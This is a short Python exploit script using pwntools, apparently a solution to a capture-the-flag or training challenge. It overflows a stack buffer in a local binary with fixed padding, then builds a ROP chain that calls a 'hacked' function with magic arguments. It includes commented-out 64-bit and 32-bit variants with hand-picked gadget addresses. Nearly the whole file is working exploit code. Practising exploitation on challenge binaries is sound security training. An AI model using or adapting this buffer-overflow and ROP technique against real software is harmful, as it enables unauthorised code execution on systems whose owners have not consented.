from pwn import *

elf = context.binary = ELF("./2")

# exp  = b'A'*24
# exp += p64(0x000000000040124b)#pop_rdi
# exp += p64(0xDEADBEEFDEADBEEF)
# exp += p64(0x0000000000401249) #pop_rsi_r15
# exp += p64(0xC0DEBABEC0DEBABE)
# exp += b"A"*8
# exp += p64(elf.symbols['hacked'])

# gs = '''
# b *0x000000000040124b
# '''
p = elf.process()

rop = ROP(elf)

rop.hacked(0xdeadbeefdeadbeef, 0xc0debabec0debabe)

# p = gdb.debug(elf.path,gs)

p.recvline()

print(rop.chain())

p.sendline(b'A'*24 + rop.chain())

p.interactive()






# exp = b"A"*28
# exp += p32(elf.symbols['hacked'])
# exp += p32(elf.symbols['main'])
# exp += p32(0xDEADBEEF)+p32(0xC0DEBABE)


# gs = '''

"""# '''
p = elf.process()

# p = gdb.debug(elf.path,gs)

rop = ROP(elf)

rop.hacked(0xdeadbeef,0xc0debabe)

p.recvline()

print(rop.chain())

p.sendline(b"A"*28 + rop.chain())

p.interactive()"""